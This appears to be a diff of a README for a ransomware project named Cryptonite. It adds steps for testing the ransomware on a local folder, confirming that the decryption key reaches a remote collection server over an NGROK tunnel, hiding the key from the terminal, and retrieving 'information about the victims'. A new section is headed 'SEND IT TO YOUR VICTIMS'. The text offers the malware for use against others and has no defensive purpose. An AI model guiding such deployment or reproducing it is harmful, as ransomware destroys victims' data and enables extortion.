@@ -82,8 +82,17 @@ We will be running the Server on port 8000 of our localhost. Hence we need to pe
   
 * Save Cryptonite.py
 
-## 5. THAT'S IT.
+## 5. TEST IT ON YOUR COMPUTER
 
+Believe me when I say this... You can safely test this Ransomware on your device provided you mention the correct path to the folder you are testing on. I have already created a testing folder and the path has also been given. So its easier for you to see for yourself. Just execute cryptonite.py and see the magic happen. If you wish to create your own folder and test it there, then mention the absolute path of the folder here.. [edit path](https://github.com/CYBERDEVILZ/Cryptonite/blob/6f85414d61f546df41840e3a3a45798b5061e3b5/Cryptonite.py#L55)
+
+Points to note...
+
+* When you execute cryptonite.py, go to the server.py terminal and lookout whether you received POST request from your localhost. If yes then the NGROK configuration was successful.
+* The decryption key will be shown to the terminal for a moment while the encryption is happening in the backend. I did this, in case you don't have a network connection, then you can directly copy and paste the decryption key into the message box that appears later requesting for a decryption key to decrypt the files. But remember, the decryption key will be shown for a short period of time. So make sure you are quick. If you don't want to show the decryption key, then you can delete the print statement here... [don't show decryption key](https://github.com/CYBERDEVILZ/Cryptonite/blob/6f85414d61f546df41840e3a3a45798b5061e3b5/Cryptonite.py#L17)
+* You can retrieve the information about the victims via executing the retrieveinfo.py file. Just type ```python retrieveinfo.py``` inside a new terminal in the current directory.
+
+## 6. SEND IT TO YOUR VICTIMS
 Now we need to create an executable of this file and send it to the victim. This part is still under development.
 
 # COMING SOON ... 
